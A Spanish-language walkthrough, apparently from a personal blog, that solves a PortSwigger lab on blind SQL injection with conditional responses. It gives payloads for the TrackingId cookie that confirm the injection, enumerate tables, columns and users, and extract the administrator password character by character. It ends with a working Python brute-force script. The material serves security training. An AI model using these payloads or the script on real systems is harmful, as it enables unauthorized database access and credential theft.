---
title: "11 Blind SQL injection with conditional responses"
collection: publications
category: portswigger
permalink: /publications/11_Blind SQL injection with conditional responses
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. Para resolver el laboratorio, realizamos un ataque de inyección SQL basado en ciego en la base de datos que recupera la contraseña del usuario administrador en la aplicación.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind SQL injection with conditional responses'
---

![logo]({{site.url}}/images/SQLi/sqli-11/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-11/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, inicia sesión como usuario administrador.

## Analisis del campo vulnerable

En esta ocación vamos a probar el `TrackingId` si es vulnerable a SQLi. La consulta se puede ver algo asi.

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

En el caso del ejemplo, la cookie contiene este contenido `TrackingId=ZJhQ1n4d7AtpomKX; session=EFsqVmORVFUeAKHnozfDBoJgsSyivWVL`

![Cookie]({{site.url}}/images/SQLi/sqli-11/cookie.png)

Si la cookie existe y es verdadera mostrara el mensaje `Welcome back!`.

![Welcome]({{site.url}}/images/SQLi/sqli-11/welcome.png)

En caso que el `TrackingId` sea falso no mostrara mensaje

![Welcome]({{site.url}}/images/SQLi/sqli-11/invalido.png)

## Comprobamos que el campo sea vulnerable - SQLi a ciegas

Payload cargado

```javascript
' and 1=1 --
```

La consulta se veria algo asi, donde comprueba el ID es valido y 1=1 es True, la consulta es valida.

```javascript
SELECT trackingId FROM someTable WHERE trackingId = 'ZJhQ1n4d7AtpomKX' and 1=1 -- '
```

![Welcome]({{site.url}}/images/SQLi/sqli-11/Payload Valido.png)

En caso que la consulta no sea valida no mostrara mensaje de `Welcome back!`, cargaremos un Payload False.

```javascript
' and 1=2 --
```
![Welcome]({{site.url}}/images/SQLi/sqli-11/Payload Invalido.png)

## Miramos cuantas columnas tiene

```javascript
' ORDER BY 1--
```

![Order By]({{site.url}}/images/SQLi/sqli-11/order by.png)

## Miramos que el campo sea String

El campo es de tipo `String`

```javascript
' UNION SELECT 'A'--
```

![String]({{site.url}}/images/SQLi/sqli-11/string.png)

## Miramos que BD esta corriendo

En este caso muestra el mensaje `Welcome back!` con la consulta de la version de Postgres.

```sql
' UNION SELECT version()--
```

![bd]({{site.url}}/images/SQLi/sqli-11/bd.png)

## Comprobamos nombre de tablas

Ya que `no` conocemos las tablas que tiene la BD, haremos un ataque para comprobar que tablas existen. Si existe la tabla tendra que mostrar el mensaje `Welcom back!` de lo contrario no mostrara nada. 

```sql
' and (SELECT 'x' FROM PAYLOAD LIMIT 1)='x'--
```

Vamos a usar la herramienta intruder para hacer el ataque.

![Intruder]({{site.url}}/images/SQLi/sqli-11/intruder.png)

Ejemplo de nombre de tablas:

```text
products
items
inventory
orders
order_items
sales
transactions
pricing
categories
customers
clients
users
profiles
subscriptions
addresses
```

Filtramos por las que tengan el mensaje de `Welcome back!` y esa tabla deberia de existir

![filtro]({{site.url}}/images/SQLi/sqli-11/filtro.png)

Filtrado

![filtro]({{site.url}}/images/SQLi/sqli-11/filtrado.png)

## Comprobamos nombres de los campos que tiene la tablas

Ya que `no` conocemos las el nombre de las filas que tiene la tablas, haremos un ataque para comprobar que nombres tiene los campos de la tabla. Si coincide algun campo tendra que mostrar el mensaje `Welcom back!` de lo contrario no mostrara nada. 

```list
id
user_id
username
email
phone_number
uuid
password
hashed_password
salt
token
last_login
login_attempts
first_name
last_name
full_name
date_of_birth
gender
address
city
state
country
postal_code
role
role_id
permissions
is_admin
is_active
```

```sql
' AND EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name = 'users' AND column_name = 'PAYLOAD')--
```

![columnas]({{site.url}}/images/SQLi/sqli-11/columnas.png)

Filtramos por el mensaje de `Welcome back!`

![columnas]({{site.url}}/images/SQLi/sqli-11/Filtro Columna.png)

Columnas filtradas que tienen el mensaje de `Welcome back!`

![columnas]({{site.url}}/images/SQLi/sqli-11/columnas filtradas.png)

## Averiguar nombre de usuarios en la BD

Ya que tenemos el nombre de la tabla y sus campos vamos a listar el nombre de los usuarios

```sql
' AND EXISTS (SELECT 1 FROM users WHERE username = 'PAYLOAD')--
```

 Lista de nombre de usuarios mas comunes

 ```
admin
administrator
root
user
guest
test
superuser
default
manager
support
moderator
developer
operator
owner
sales
marketing
finance
hr
accounting
itadmin
 ```

 Realizamos el ataque de intruder

![Intruder 2]({{site.url}}/images/SQLi/sqli-11/Intruder2.png)

Filtramos los usuarios que tienen el mensaje de `Welcome back!` y esos son los que existen en la tabla.

![Filtado 2]({{site.url}}/images/SQLi/sqli-11/filtrado2.png)

## Enumerar la contraseña del usuario

Al ingresar un usuario y contraseña invalido nos arroja el siguiente error

![Login 2]({{site.url}}/images/SQLi/sqli-11/incorrecto.png)

El payload es tipo entero, ya que vamos a averiguar cuantos caracteres tiene el password de un usuario.

```sql
' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = PAYLOAD--
```
![Longitud]({{site.url}}/images/SQLi/sqli-11/longitud password.png)

Filtramos por el mensaje `Welcome back!`

![Longitud 2]({{site.url}}/images/SQLi/sqli-11/longitud password filtro.png)

Longitud de caracteres que tiene el password

![Longitud 2]({{site.url}}/images/SQLi/sqli-11/longitud.png)

## Ataque de Fuerza al campo Password

Utiliza una consulta que verifique si un carácter en una posición específica coincide con una letra de tu conjunto de prueba

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a'--
```

![Ataque password]({{site.url}}/images/SQLi/sqli-11/ataque password.png)

Filtramos por las consultas que tienen la frase `Welcome back!`

![Ataque password]({{site.url}}/images/SQLi/sqli-11/filtro ataque.png)

Manualmente obtenemos el password

![Manual]({{site.url}}/images/SQLi/sqli-11/manual.png)

```javascript
cedh8jyjns3sevnw0znp
```

## Login

![Login]({{site.url}}/images/SQLi/sqli-11/login.png)

## Resuelto

![Login]({{site.url}}/images/SQLi/sqli-11/resuelto.png)

# Codigo Python

```python
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'dCqiyv8E4BfhhpHL' + sqli_payload_encoded, 'session': 'bdb4dZfXEcfucciq98jCIYBJW4NL7y7M'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
```